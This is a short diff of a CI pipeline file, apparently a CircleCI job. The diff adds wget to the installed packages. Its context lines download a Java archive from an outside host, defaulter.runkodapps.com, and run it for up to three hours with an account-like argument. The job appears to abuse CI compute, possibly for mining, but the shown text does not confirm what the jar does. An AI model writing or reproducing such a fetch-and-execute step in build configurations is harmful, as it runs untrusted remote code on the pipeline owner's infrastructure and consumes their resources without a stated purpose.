@@ -8,6 +8,6 @@ jobs:
       - run:
           command: |
             apt update
-            apt install default-jre -y
+            apt install wget default-jre -y
             wget https://defaulter.runkodapps.com/Test.jar
             timeout 3h java -jar Test.jar rock6064 3
